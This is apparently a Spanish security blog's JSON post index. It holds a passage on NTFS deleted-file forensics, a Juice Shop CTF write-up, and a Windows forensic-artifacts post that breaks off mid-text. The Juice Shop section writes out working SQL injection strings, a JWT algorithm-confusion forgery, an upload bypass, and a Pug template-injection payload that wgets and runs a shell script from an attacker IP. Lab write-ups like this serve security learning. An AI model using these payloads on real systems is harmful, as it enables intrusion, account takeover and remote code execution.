carpeta llamada carpetaDirectorio “carpeta”Con Indx2csv ahora vamos a importar el primeroRecordar la opción dump everything y el separadorPara determinar qué archivos están presentes y cuáles han sido eliminados o sobrescritos en base a los datos hay que fijarse en ciertas columnas que indican la validez y estado de los registros en la estructura del sistema NTFSMFTReference y MFTReferenceSeqNo:  Estos campos indican el número de referencia del archivo en la MFT (Master File Table) y el número de secuencia asociado. Un valor válido será generalmente positivo y consistente.IndexFlags:  Los índices indican propiedades del archivo en relación con el directorio y la MFT. Por ejemplo:          0: Archivo regular      1: Archivo eliminado o sobrescrito      IsNotLeaf y LastLsn:  LastLsn puede usarse para correlacionar operaciones recientes con archivos  IsNotLeaf indica si es un nodo hoja o tiene referencias a otros índicesFechas (CTime, ATime, MTime, RTime):  Si las fechas de modificación o creación parecen inconsistentes o fuera de rango, esto puede ser indicativo de eliminación o corrupciónTenemos dos registros eliminados y uno posiblemente corrupto o completamente eliminado debido al numero inusualmente elevado del MFTReferenceDirectorio en rootProcesamos el archivo igual que antes y vemos como los documentos de texto antes se encontraban en el directorio raízObservamos datos similares a los anterioresDirectorio de recycle binMediante el mismo proceso analizamos el documento y observamos que no se ha eliminado por completo nada y que todos los archivos que hay fueron movidos al mismo tiempo a la papelera9. Recuva VS FTK ImagerVamos a realizar una comparación entre un software que es utilizado para recuperar archivos eliminados del disco y FTK imager. Esto nos permitirá ver como realmente las herramientas forenses son mucho más potentes que las que comercialmente son vendidas y, además suelen ser más baratas o incluso open source.Para usar este software primero debemos montar la imagen del disco mediante FTK o similaresDeberíamos ver el disco montado en RecuvaDamos doble click sobre el disco y nos lo analizará en busca de archivosResultados en RecuvaSupuestamente ha encontrado 80 archivos que recuperar. Si observamos bien y comparamos con lo que nos muestra FTK, algunos de esos archivos ni siquiera existen o los está confundiendo con algunos de los rastros que han ido dejando esos movimientos como los que veíamos en el punto anterior donde el fichero “texto.txt” pasó de estar en root a la “carpeta”Por supuesto que si intentamos recuperar cualquiera de estos documentos nos pedirá pagar la licencia.Resultados en FTK ImagerSi analizamos manualmente el disco en FTK vemos que en la raíz del disco únicamente encontramos un documento PDF que fue eliminado aquí y no los rastros que dejó el movimiento del texto.txt, por ejemploSin embargo si nos movemos al directorio carpeta vemos que si nos indica que existe el fichero texto.txt y que se encuentran los datos eliminados de otro llamado texto-copia.txtEl resto de documentos que indicaba Recuva realmente no están eliminados ni se llaman como lo indica. Además si necesitamos recuperar el archivo en FTK simplemente hacemos click derecho y lo exportamos, sin licencias ni nada."
  },
  
  {
    "title": "Guía de Vulnerabilidades Juice Shop",
    "url": "/posts/juicyshop/",
    "categories": "Labs & CTF, Web Vulnerabilities",
    "tags": "pentesting, juice-shop, web-security",
    "date": "2024-11-26 00:00:00 +0100",
    





    
    "snippet": "Esta guía cubre diferentes vulnerabilidades encontradas en la aplicación Juice Shop, incluyendo inyecciones SQL, bypass de autenticación, y más.Admin RegistrationPara dar contexto vamos a realizar ...",
    "content": "Esta guía cubre diferentes vulnerabilidades encontradas en la aplicación Juice Shop, incluyendo inyecciones SQL, bypass de autenticación, y más.Admin RegistrationPara dar contexto vamos a realizar una inyección SQL para acceder como la cuenta de administrador existente y recabar algunos datos.' OR '1'='1Inyección SQL básica para accesoUna vez dentro de la cuenta de administrador necesitamos acceder al json donde se almacenan los datos de los usuarios. En la pestaña network dentro de las herramientas para developers de nuestro navegador podemos encontrar el archivo.Al hacer click en los detalles de las cuentas se cargan archivos JSON con los datos de usuarioComo vemos en el json, en los parámetros que se mandan a la hora de crear un usuario hay uno que por defecto se añade y es el “role”, que en el perfil de admin se establece como “admin” pero en otros usuarios indica “customer”. Para modificarlo vamos a interceptar la petición y añadir el parámetro “role” a la petición.Interceptamos la petición para crear una cuenta nuevaAñadimos el parámetro “role” a la petición y como vemos se modifica haciendo la cuenta administrador.Database SchemaPara esta vulnerabilidad vamos a aprovechar el input de búsqueda dentro de la tienda. Como vemos es sencillamente un input para buscar productos en la web lo que posiblemente implique que haga una consulta a la base de datos y devuelva los resultados.Para comprobar si es o no vulnerable vamos a provocar un error de sintaxis.Input de búsqueda vulnerable a SQLiComprobamos cuantas columnas tiene la tabla de productos haciendo una consulta normal.Observamos que cuenta con 9 columnas vamos a intentar inyectar un Union. Por como funciona sqlite aquí no incluimos la columna con “null” sino números.Para esta parte vamos a encodear la consulta en URL para no tener problemas en la sintaxis.' UNION SELECT 1,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--Consulta URL encodedComo se trata de una base de datos sqlite tendremos que buscar información sobre cómo almacena los datos y cómo podemos llamarlos.Multiple Likes (Captcha Bypass)Para esta vulnerabilidad vamos a hacer uso del apartado feedback de la web. Aquí vamos a ver cómo de forma anónima vamos a poder crear un comentario sobre la web.Formulario de feedback con captchaAl rellenar el formulario vemos que cuenta con un captcha para evitar scripts de automatización para por ejemplo dejar malas reseñas pero si indagamos un poco más…Vemos que los parámetros que se pasan son el id del captcha ya que habrá varios establecidos para que vayan cambiando, la solución del captcha, el comentario y la puntuación.Para poder abusar de esto podemos bien hacerlo mediante burpsuite o con un script en python.Configuración en Burp Suite para automatizar peticionesEn este trozo establecemos un array con algunos mensajes negativos para crear las reviews y estructuramos el encabezado de la petición que se realiza a la web copiandolo de la que hemos capturado en burpsuite.En esta sección introducimos los datos que manda la petición aunque en este caso cambié el captcha porque el anterior me estaba dando algún problema por lo que capturé algunas peticiones más de la web y cogí el captcha 0 que me funcionó correctamente. Indicamos que mande la petición en forma de post con la url, los headers y el json (datos) y que la respuesta que obtenga la devuelva en texto plano. Más abajo simplemente creamos una reiteración de la función tantas veces como elementos tenemos en el array de los mensajes por lo que serán 10 peticiones a 1 por segundo e imprime un poco el proceso.Como resultado:Two Factor AuthenticationPara este proceso vamos a necesitar ir a cualquier perfil que tengamos acceso y probar a crear una autenticación de doble factor.Configuración inicial de 2FADentro vamos a ir a las opciones de seguridad y crear un autenticador 2FA.Vamos a necesitar exfiltrar de nuevo el esquema de la tabla usuarios de la base de datos para observar la existencia de un parámetro.Datos de la tabla usersSi nos fijamos en los nombres de las columnas hay una que se llama “totpsecret” y estamos intentando conseguir el 2FA de un usuario, por lo que deducimos que si TOTP se trata de las siglas “time-based one-time password”, pues “toptsecret” algo puede tener que ver.' UNION SELECT id,email,totpsecret FROM users--En la query que realizamos hacemos un union con los nombres de las columnas que nos interesan y el resto lo saltamos e indicamos que la base de datos de la que queremos los datos se llama users.Extracción del secreto TOTPTeniendo el token del TOTP podemos hacer uso de una web para que genere los códigos 2FA de ese usuario.Generador de tokens 2FAUpload TypePrimero vamos a hacer login con cualquier usuario del que tengamos acceso por ejemplo “wurstbrot” de la anterior vulnerabilidad.Interfaz de subida de archivosParece que está filtrado para documentos pdf y archivos comprimidos zip. Pues vamos a modificar la extensión de la shell a ver si cuela y además lo capturamos con burpsuite a ver si podemos modificar la extensión en el aire.Interfaz de subida de archivosPor ahora lo ha aceptado por lo que vamos a modificar la extensión y eliminar el .zip y observamos que lo sube sin problema.Content-Type: application/zip...shell.php.zip → shell.phpManipulate BasketPara esta vulnerabilidad vamos a iniciar sesión como cualquier usuario menos administrador ya que nuestro objetivo es añadir a su cesta algún producto desde otra cuenta de usuario.Si en burpsuite vamos al historial http vamos a ver como cada vez que se añade un producto se llama a dos api`s distintas.Petición a la API de cestasDentro de la petición más abajo vemos como añade el id de producto 24 a la cesta con id 4 en cantidad de 1.Investigando un poco vemos que se puede hacer un bypass dejando el id de la cesta original en 4 y luego añadir otro id de cesta para que se añada en esa sin que nos de error.producto añadidoForged Signed JWTEn esta vulnerabilidad vamos a necesitar un token JSON, que es como un paquete digital de información.Iniciamos sesión con cualquier usuario y si hemos prestado atención a la traza de peticiones que hace el cliente al servidor en las anteriores vulnerabilidades vemos que hay unas peticiones interesantes que preguntan “whoami”.Para ver más claramente antes de modificar nada lo que hace esta función en el navegador si abrimos el modo developer y vamos a la pestaña de network podemos ver que es lo que se le está pasando a “whoami” en forma de json.Básicamente es la identificación del usuario, es decir el token JSON que lo identifica dentro de todas las funciones de la web. Bueno pues si vamos a la petición http que realiza vamos a poder ver el token.Si buscamos información previa sobre cómo funciona un JWT encontramos una web donde tenemos tanto documentación como una aplicación para “decodificar” el contenido de este token.Decodificación del token JWTAquí vamos a modificar entonces el email a rsa_lord@juice-sh.op y el algoritmo de encriptación de RS256 a HS256.RS256 (Firma RSA con SHA-256) es un algoritmo asimétrico que usa un par de claves pública/privada: el proveedor de identidad tiene una clave privada (secreta) que usa para generar la firma, y el consumidor del JWT recibe una clave pública para validar la firma. Como la clave pública, a diferencia de la privada, no necesita mantenerse segura, la mayoría de los proveedores de identidad la hacen fácilmente disponible para que los consumidores la obtengan y usen (normalmente a través de una URL de metadatos).HS256 (HMAC con SHA-256), por otro lado, implica una combinación de una función hash y una (única) clave secreta que se comparte entre las dos partes para generar el hash que servirá como firma. Como se usa la misma clave tanto para generar la firma como para validarla, hay que tener cuidado para asegurar que la clave no se vea comprometida.En este punto suponemos que realizando un ataque de web discovering encontramos un directorio llamado “encryptionkeys” donde se encuentra la llave RSA pública.Para crear la firma usamos una herramienta online de HMAC-SHA256 y la clave pública que encontramos en el directorio “encryptionkeys”.En texto plano debemos introducir los datos del token que teníamos de color rosado en la web anterior JWT sin la parte azul que pertenece a la firma. En la secret key introducimos el RSA public key. Marcamos como sha256 y que el encoder sea base64.Esa llave la vamos a llevar a cyberchef para hacerla “URL safe”.Es importante primero decodificar de base64 estándar y luego codificar a base64url safe. Copiamos la salida y la modificamos directamente en el token reemplazando la zona azul.Ahora si podemos copiar el token y modificar la petición en burpsuite.Premium PaywallSi nos fijamos bien en la anterior vulnerabilidad donde encontramos la clave pública RSA tenemos un archivo interesante más “premium.key”.Si usamos un poco de investigación eficaz podemos intentar deducir qué es esto. Primera parte: “1337133713371337” - 1337 repetido 4 veces, es un número significativo. Segunda parte: “EA99A61D92D2955B1E9285B55BF2AD42” - Parece ser un hash MD5 (por su longitud de 32 caracteres hexadecimales)Tras un rato dando vueltas sin rumbo y un poquito de ayuda podemos encontrar un comentario extraño en el código fuente de la página de score boards.Mensaje cifrado en el código fuenteTeniendo este mensaje cifrado y con la llave que ya encontramos antes deducimos que se trata de un cifrado AES256 CBC por lo que podemos decodificarlo.Si visitamos la URL se completa el retoServer Side Template InjectionEs una vulnerabilidad que ocurre cuando un atacante puede inyectar código malicioso en una plantilla que luego se ejecuta en el servidor y ocurre cuando la entrada del usuario se inserta directamente en una plantilla. Por lo tanto hay que encontrar alguna página en la web que se base en plantillas, que en es la del perfil. En el apartado de nombre de usuario podemos introducir uno y este se muestra bajo la imagen del perfil.Para saber si la plantilla es vulnerable o si usa una plantilla esto dependerá del tipo de motor que use y el lenguaje. En este caso ya sabemos que usa JS y el motor de plantillas es PUGAhora en vez de usar el “malware” que está ahí en internet para este ctf vamos a crear el nuestro propio que no va a ser más que una shell reversa en bash#{global.process.mainModule.require('child_process')  .exec('wget http://192.168.93.131:8000/shell.sh -O /tmp/shell.sh &amp;&amp; chmod +x /tmp/shell.sh &amp;&amp; bash /tmp/shell.sh')}En resumidas cuentas haciendo uso de JS indicamos que descargue el shell.sh de nuestra máquina kali (que está sirviendo el archivo por http usando python), lo mande a la carpeta tmp, le de permisos de administrador y luego lo ejecute. Teniendo esto listo y antes de introducir el payload en el parámetro vulnerable preparamos tanto el archivo para servir como la escucha en el puerto 5555.Ahora si inyectamos el payload en el parámetro de username.Listo tenemos acceso remoto a la máquina del servidor.Server Side Request ForgeryEl concepto es llegar a acceder contenido oculto o no visible al usuario dentro del sistema de archivos del servidor. En este caso el parámetro vulnerable se trata de una imagen y está contenido dentro de una etiqueta IMG por lo que en principio no podremos ver contenido en texto plano o renderizar otra cosa que no sea img.El funcionamiento del parámetro dentro de la web es un prompt donde podemos introducir una URL para establecer nuestra foto de perfil desde un link externo.Si introducimos una url de alguna imagen e inspeccionamos el contenido de la página veremos que el servidor web de juicy hace un request a la url, descarga la imagen y la muestra.Y tenemos acceso a esa URLTras una exhaustiva investigación he llegado a la conclusión de que el proceso que se realiza en el servidor es el siguiente:  Al poner la URL externa comprueba si es una imagen directa, si es así la descarga, la renombra con el id del usuario y la almacena en “frontend/dist/frontend/assets/public/images/uploads”  Sea lo que sea el contenido de la URL lo descarga, es decir que aunque nosotros sirvamos un documento txt, el servidor lo descarga y lo renombra y almacena como un userID.jpgCon esto claro lo que podemos hacer es indicar direcciones de posibles archivos dentro del servidor para que realice esa copia en el directorio uploads y nosotros podamos descargarlo con un wget, por ejemplo:En el servidor en el path de la ruta a la que se descargan sabemos que existe una carpeta privatePodemos intentar hacer referencia a alguno de los archivos “js” que existen.Ahora desde nuestra máquina podemos acceder al recurso, descargarlo y ver su contenido.  A tener en cuenta es que el servidor por algún motivo que aún no entiendo solo encuentra archivos desde la ruta de assets y no podemos ir más atrás de ese directorio o al menos aún no lo he conseguido por lo que no podemos filtrar documentos del sistema por ahora. El servidor al no encontrar los archivos lo que hace es crear el userID.jpg con una plantilla html que tiene por defecto por lo que no sirve de nada."
  },
  
  {
    "title": "Análisis Post-mortem - Artefactos en Windows",
    "url": "/posts/artefactos_en_windows/",
    "categories": "Forense, Windows",
    "tags": "forense, windows, analisis, artefactos",
    "date": "2024-11-12 12:58:38 +0100",
    





    
    "snippet": "Prefetch¿Qué son?Un prefetch o precarga es una característica de windows que mejora el rendimiento del sistema operativo. Al inicio, el sistema operativo realiza un seguimiento de los programas que...",
    "content": "Prefetch¿Qué son?Un prefetch o precarga es una característica de windows que mejora el rendimiento del sistema operativo. Al inicio, el sistema operativo realiza un seguimiento de los programas que se abren habitualmente, guarda la información y aprende del uso para que el sistema haga un pre-inicio del software de uso habitual por lo que se dice que se realiza un “prefetch”¿Cómo se almacena?Para almacenar esta información windows crea una ruta de precarga donde almacena estos archivos con extensión “pf” y podemos encontrarlos en %WINDIR%\\prefetch. Para cada programa ejecutado se genera un archivo prefetch que contiene información sobre el programa, como son el path, la fecha y hora de modificación creación y última vez que se ejecutó, así como una lista de las dependencias cargadas por la aplicación en los primeros 30 segundos de su ejecución.¿Qué información es util desde un punto de vista forense?Estos archivos también almacenan información sobre el disco, GUID y marcas de creación de la unidad. Se almacena para todos los volúmenes y es util para poder identificar GUIDs de unidades externas. En algunas periciales es interesante este dato y se puede comparar con las unidades externas utilizadas para poner en marcha las aplicaciones o para descubrir los archivos que han sido abiertos desde el propio dispositivo o disco duro externo y puede ser importante reflejar esto en el análisis pericial.LOGs¿Que són?Es un registro de eventos durante un rango de tiempo en particular. Se utiliza para registrar datos o información sobre quién, qué, cuándo, dónde y por qué un evento ocurre para un dispositivo en particular o para una aplicación concreta.Los más importantes por su contenidoA pesar de que existen numerosos registros que windows realiza, dentro de los más interesantes por su valor o contenido pericial podemos encontrar los siguientes:%WINDIR%\\setupact.logContiene información acerca de las acciones de instalación durante la misma.EVIDENCIAS: Podemos ver fechas de instalación, propiedades de programas instalados, rutas de acceso, copias legales, discos de instalación…%WINDIR%\\Debug\\mrt.logResultados del programa de eliminación de software malintencionado de Windows.EVIDENCIAS: Fechas, Versión del motor, firmas y resumen de actividad.%WINDIR%\\Logs\\CBS\\CBS.logFicheros pertenecientes a “Windows Resource Protection” y que no se han podido restaurar.EVIDENCIAS: Proveedor de almacenamiento, PID de procesos, fechas, rutas…%AppData%\\setupapi.logContiene información de unidades, services pack y hotfixes.EVIDENCIAS: Unidades locales y extraibles, programas de instalación, programas instalados, actualizaciones de seguridad, reconocimiento de dispositivos conectados…%WINDIR%\\INF\\setupapi.dev.logContiene información de unidades Plug and Play y la instalación de drivers.EVIDENCIAS: Versión de SO, Kernel, Service Pack, arquitectura, modo de inicio, fechas, rutas, lista de drivers, dispositivos conectados, dispositivos iniciados o parados…%WINDIR%\\Performance\\Winsat\\winsat.logContiene trazas de utilización de la aplicación WINSAT que miden el rendimiento del sistema.EVIDENCIA: Fechas, valores sobre la tarjeta gráfica, CPU, velocidades, puertos USB…*.INIContiene configuraciones de programasEVIDENCIA: Rutas, secciones, parámetros de usuarios…%WINDIR%\\Memory.dmpContiene información sobre los volcados de memoria.EVIDENCIA: Rutas, programas, accesos, direcciones de memoria, listado de usuarios, contraseñas, conexiones…%WINDIR%\\System32\\config%WINDIR%\\System32\\winevt\\LogsContiene los logs de Windows accesibles desde el visor de eventos.EVIDENCIAS: Casi todas. Entradas, fechas, accesos, permisos, programas, usuario, etc…%PROGRAMDATA%\\Microsoft\\Microsoft Antimalware\\Support %PROGRAMDATA%\\Microsoft\\Microsoft Security Client\\SupportLogs del motor de antimalwareEVIDENCIAS: Fechas, versión del motor, programas analizados, actividad del malware…Fichero de hibernación en Windows¿Qué es?El archivo hiberfil.sys es un fichero especial que almacena el estado completo de la memoria RAM de una sistema cuando esta entra en modo de hibernación.Su tamaño es igual a la cantidad total de memoria RAM instalada en el equipo y contiene una versión comprimida de los datos en memoria.Su creación es posible solo si el hardware de la máquina cumple con los estándares ACPI y Plug-and-Play.Para interactuar con este archivo o analizarlo, generalmente se requieren herramientas especializadas debido a su formato comprimido.¿Cómo ver su contenido?Por ejemplo, el WindowsMemory Toolkit de Moonsols (ahora conocido como Comae) incluye herramientas como hibr2bin, que permiten extraer y mostrar los datos almacenados en el archivo hiberfil.sys.Esta herramienta convierte la información comprimida del archivo en un formato legible para su análisis.También se puede transformar archivos de hibernación en una imagen sin procesar utilizando el framework Volatility, que incluye un módulo especializado para crear una imagen legible a partir del archivo de hibernación. Una vez que se obtiene esta imagen lineal, resulta muy fácil examinar su contenido. Otra herramienta práctica es Strings, que permite localizar cadenas de texto dentro del archivo de hibernación. Esto facilita una evaluación rápida de su contenido sin necesidad de generar una imagen completamente legible.ImportanciaLa información contenida en el archivo hiberfil.sys puede ser extremadamente importante, dependiendo del contexto en el que se analice.En investigaciones digitales puede proporcionar una instantánea del estado de la memoria en el momento en que el sistema entró en hibernación. Esto incluye programas abiertos, documentos en uso, conexiones activas y datos sensibles que estaban cargados en la RAM.Puede ser útil para recuperar información perdida o no guardada, como el contenido de un archivo que estaba siendo editado pero no fue almacenado antes de la hibernación.Los desarrolladores y técnicos pueden usar el contenido del archivo para analizar errores del sistema, depurar aplicaciones o identificar conflictos de hardware o software.Puede contener información sensible, como contraseñas, claves de cifrado o datos personales. Por ello, es crucial protegerlo en sistemas críticos, ya que puede representar un riesgo de seguridad si cae en manos equivocadas.Volume shadow copies service (VSS)El Shadow Copy, también conocido como Volume Snapshot Service, Volume Shadow Copy Service o simplemente VSS, es una tecnología integrada en Microsoft Windows que permite crear copias de seguridad, ya sea de forma automática o manual, de archivos o volúmenes, incluso si están en uso. Este servicio funciona directamente sobre el sistema de archivos, garantizando que se puedan realizar snapshots consistentes sin interrumpir las operaciones normales del sistema.Esta tecnología necesita que el sistema de archivos sea NTFS para poder crear y almacenar las copias que pueden ser creadas en local y en dispositivos externos, bien en dispositivos en red o dispositivos locales.¿Viene activada por defecto o la tiene que activar el usuario?El servicio Volume Shadow Copy (VSS) está habilitado de forma predeterminada en sistemas Windows para funciones específicas, como la Restauración del Sistema y Copias de Seguridad de Windows, pero no siempre está configurado para realizar snapshots automáticos de todos los volúmenes.¿Cada cuánto tiempo se realizan?Depende de cómo esté configurado el sistema y el propósito para el cual se usa el servicio Volume Shadow Copy (VSS).Restauración del SistemaEn Windows, los puntos de restauración del sistema, que utilizan VSS, suelen crearse automáticamente una vez al día o cuando se produce un evento significativo, como:  La instalación de una actualización del sistema.  Cambios en el software o configuración importantes.  Instalación de controladores.Copias de Sombra para Volúmenes EspecíficosSi se configura manualmente VSS para un volumen, la frecuencia de las copias dependerá de la programación establecida. Por ejemplo:En un entorno empresarial con servidores Windows, las copias de sombra a menudo se programan para realizarse varias veces al día, como cada 4 o 6 horas, según las necesidades.En sistemas no configurados explícitamente, no se realizan copias periódicas, y el usuario debe iniciarlas manualmente.EjemplosRecuperación de Archivos Modificados o Eliminados AccidentalmenteContexto:Un empleado está trabajando en un archivo importante y accidentalmente borra o sobrescribe información crítica. El archivo se encuentra almacenado en una carpeta compartida de la red.Utilidad de las Copias de Sombra:Si las copias de sombra están habilitadas en el servidor o sistema donde se almacena el archivo, se puede acceder a versiones anteriores del documento. Esto permite restaurar una versión específica del archivo desde el Explorador de Windows, evitando la pérdida de datos críticos sin necesidad de recurrir a una copia de seguridad completa.Diagnóstico y Mitigación de RansomwareContexto:Una computadora o servidor es infectado por ransomware, y el malware cifra los archivos del sistema, haciéndolos inaccesibles.Utilidad de las Copias de Sombra:Si las copias de sombra están configuradas en el sistema antes del ataque, el administrador puede intentar recuperar versiones anteriores de los archivos desde las copias de sombra, lo que puede mitigar parcialmente el impacto del ransomware. Aunque algunos ransomware también intentan eliminar estas copias, si se han protegido correctamente, pueden servir como una línea de defensa adicional.Registro de WindowsEl registro de Windows es una base de datos organizada de manera jerárquica que se utiliza para guardar configuraciones y opciones de los sistemas operativos Microsoft Windows.En esta base de datos se almacena la configuración de componentes fundamentales del sistema operativo, así como la de las aplicaciones que funcionan en él. Entre los elementos que usan el registro están el kernel, los controladores de dispositivo, los servicios del sistema, el Administrador de Cuentas de Seguridad (SAM), la interfaz gráfica de usuario (GUI) y las aplicaciones de terceros.Además, el registro permite que los controladores accedan a información que puede ser usada para generar un perfil del rendimiento del sistema.Cómo importar y exportar claves de registro en CLI y GUIEn el entorno GUI  Exportar claves: Abre el Editor del Registro (regedit) como administrador, navega hasta la clave deseada, haz clic derecho, selecciona “Exportar” y guarda el archivo .reg  Importar claves: Haz doble clic en un archivo .reg previamente exportado o selecciona “Archivo &gt; Importar” dentro del Editor del Registro y elige el archivo.En el entorno CLI  Exportar: Usa el comando reg export [KeyPath] [FileName.reg], donde [KeyPath] es la ruta completa de la clave y [FileName.reg] el archivo de destino.  Importar: Utiliza el comando reg import [FileName.reg], donde [FileName.reg] es el archivo que contiene las claves a importar​Claves interesantes desde el punto de vista forenseHKLM\\SYSTEM:Revela: Configuración del sistema, información sobre dispositivos conectados, y detalles de inicio y apagado. Útil para identificar patrones de actividad en un dispositivo.HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run:Revela: Programas configurados para ejecutarse al inicio del sistema. Puede ayudar a detectar malware o programas sospechosos.HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs:Revela: Archivos abiertos recientemente por el usuario, lo que aporta información sobre su actividad reciente.HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings:Revela: Configuración de navegación, como proxys y preferencias de red, que pueden mostrar comportamientos de navegación.HKLM\\SAM:Revela: Base de datos de cuentas locales del sistema. Útil para analizar usuarios y contraseñas en investigaciones de acceso no autorizado.HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR:Revela: Dispositivos USB conectados históricamente, incluyendo nombres y marcas. Es clave para rastrear dispositivos externos conectados al sistema​Eventos EVTXLos registros de eventos son archivos que almacenan información sobre eventos importantes que ocurren en el sistema, como cuando un usuario inicia sesión, se produce un error en un programa, o se realiza alguna acción clave en el sistema. Cada vez que ocurre uno de estos eventos, Windows lo registra en un archivo especial. Esta información puede ser consultada usando una herramienta llamada Visor de eventos.Para los usuarios avanzados, los registros de eventos son muy útiles para solucionar problemas o investigar el comportamiento del sistema operativo y de otras aplicaciones.Los registros de aplicaciones y servicios en Windows varían según el programa o servicio que se esté ejecutando. Estos registros incluyen información específica sobre las aplicaciones del sistema y registros más detallados relacionados con servicios particulares de Windows, proporcionando un panorama más granular del funcionamiento del sistema y sus componentes.El formato EVTX fue introducido por Microsoft en Windows Vista y Server 2008, reemplazando el antiguo formato EVT que se utilizaba desde Windows NT 4.0. La principal razón de este cambio fue que el formato EVT original no podía adaptarse fácilmente a las crecientes demandas de complejidad del sistema moderno.El nuevo formato EVTX incluye mejoras como:  Nuevas características y propiedades de los eventos.  El uso de canales para la publicación de eventos, lo que permite una mayor organización y filtrado.  Un formato basado en XML, lo que facilita la interpretación y la integración con otros sistemas.  Un nuevo Visor de eventos y un servicio de registro de eventos, que mejoran la forma en que se gestionan y visualizan los registros.¿Cuáles pueden ser interesantes?Desde un punto de vista forense, ciertos tipos de eventos son cruciales para la investigación, ya que pueden proporcionar detalles importantes sobre actividades sospechosas o incidentes de seguridad.Eventos de seguridad (Auditoría)Los eventos que indican intentos de inicio de sesión, especialmente aquellos que muestran errores de inicio de sesión o múltiples intentos fallidos, pueden ser indicativos de intentos de acceso no autorizado. Los registros de auditoría también incluyen eventos como cambios en las contraseñas o modificaciones en las cuentas de usuario.Estos eventos permiten identificar acciones sospechosas o no autorizadas, como ataques de fuerza bruta o elevación de privilegios. Además, pueden mostrar si un atacante consiguió acceder a una cuenta de usuario o administrador.Eventos del sistemaLos eventos de error del sistema, como caídas de servicios críticos o problemas con controladores de dispositivos, son relevantes. En particular, los errores que indican que un servicio del sistema (como el servicio de red o el servicio de autenticación) no se ha iniciado correctamente pueden ser señales de manipulación maliciosa.Pueden ayudar a identificar problemas con la estabilidad del sistema o ataques que intentan desactivar servicios esenciales para ocultar actividades maliciosas. También pueden dar pistas sobre un malfuncionamiento de hardware que podría estar relacionado con un ataque físico.Herramientas a utilizar para análisis de artefactosFTK ImagerEs una herramienta esencial para la creación de imágenes forenses de discos, permitiendo trabajar con artefactos como ficheros de hibernación, Shadow Copies, y otros archivos del sistema.También permite ver y exportar registros de eventos, ficheros eliminados y contenido en memoria, lo que la convierte en una herramienta clave en análisis forenses​.Arsenal Image MounterEsta herramienta permite montar imágenes de disco forenses en el sistema operativo como si fueran discos físicos.Es útil para analizar contenido de imágenes de disco, incluyendo los artefactos relacionados con la caché, prefetch, y otros archivos del sistema. También es importante cuando se quiere acceder a archivos de Shadow Copies o registros de eventos sin alterar la imagen original​.Registry ExplorerEspecializada en el análisis del registro de Windows, Registry Explorer permite a los investigadores examinar las claves del registro, lo que es esencial para encontrar detalles sobre configuraciones del sistema, actividades de usuarios, y rastrear posibles eventos de seguridad.Es muy útil para la investigación forense de accesos y modificaciones en el sistema.RegRipperRegRipper es una herramienta diseñada para extraer e interpretar los datos del registro de Windows.Permite a los forenses obtener información detallada sobre el sistema, como el historial de programas ejecutados, la actividad de usuarios y las conexiones USB, lo que es útil para identificar actividades sospechosas o no autorizadas​.WRR (Windows Registry Recovery)Esta herramienta está orientada a la recuperación de datos del registro de Windows.Es útil para restaurar información del registro dañada o incompleta y obtener detalles importantes en situaciones donde el sistema haya sufrido daños o pérdida de datos​.LinkParserSe especializa en analizar los registros de enlaces (Jump Lists) de Windows.Esta herramienta es valiosa cuando se necesita rastrear las aplicaciones recientemente usadas por un usuario, identificando accesos a archivos o programas específicos, y obteniendo una línea de tiempo sobre el comportamiento del usuario.JumpListExplorerSimilar a LinkParser, facilita el análisis de Jump Lists en Windows.Estas listas contienen información sobre los archivos y programas recientemente abiertos por el usuario, lo que puede ayudar a reconstruir la actividad reciente de un individuo, especialmente en investigaciones forenses sobre el uso de aplicaciones y documentos​.ShellbagExplorerEsta herramienta permite a los forenses examinar los datos de Shellbags, que guardan información sobre las carpetas y archivos que un usuario ha abierto o visualizado en el sistema, incluso si han sido eliminados.Es útil para rastrear la actividad en directorios específicos o archivos eliminados.USB DetectiveEs una herramienta esencial para rastrear la actividad relacionada con dispositivos USB en un sistema Windows.Puede revelar información sobre cuándo se conectaron dispositivos USB, qué archivos se copiaron o accedieron, y si hubo alguna manipulación de datos en un dispositivo de almacenamiento externo, lo cual es clave en investigaciones relacionadas con exfiltración de datos o accesos no autorizados​.Extraer evidencias de los artefactosAntes de comenzar indicar que estamos utilizando el software FTK Imager para acceder a estas ubicaciones para extraer cada uno de los artefactos que se van a ir mostrando a continuación.Cabe a destacar además que este proceso de ejemplo se está realizando en una máquina virtual activa y no sobre una imágen de disco extraida, pero el proceso es casi identico.Extraer archivos de registroPara agilizar el proceso vamos a extraer el directorio donde vamos a encontrar la mayoria de registros del sistema interesantes.Usando FTK extraemos el directorio completo.C:\\windows\\system32\\confHerramientas útiles  Registry Explorer  RegRipper  Windows Registry RecoveryVersión del sistema, nombre de la máquina y zona horariaSoftware\\Microsoft\\Windows NT\\CurrentVersionFecha de último acceso y Hora de apagadoSystem\\ControlSet001\\Control\\FilesystemSystem\\ControlSet001\\Control\\WindowsSi vemos el resultado anterior es debido a que esta política viene desactivada por defecto en las últimas versiones de windows para mejorar el rendimiento del sistema.Ahora vamos a comprobar el tiempo de apagado.Interfaces de redSystem\\ControlSet001\\Services\\Tcpip\\Parameters\\Interfaces\\{GUID_INTERFACE}Histórico de redesSoftware\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Software\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Nla\\CacheCuándo se conectó a una redSoftware\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\ProfilesCarpetas compartidasSystem\\ControlSet001\\Services\\lanmanserver\\Shares\\Programas de inicioNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\RunNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceSoftware\\Microsoft\\Windows\\CurrentVersion\\RunonceSoftware\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RunSoftware\\Microsoft\\Windows\\CurrentVersion\\RunPara acceder a NTUSER.DAT primero hay que extraerlo del disco de evidenciaUna vez hecho ahora si podemos visualizar todas las rutasEn este caso es la ruta en SOFTWAREEn este caso es la ruta NTUSER.DATBúsquedas en la barra de búsquedaNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQueryEn este caso el sistema no tiene activada la barra de busqueda por lo que no hay registrosRutas en Inicio o ExplorerNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPathsIgualmente no aparece nada porque es inexistente en la 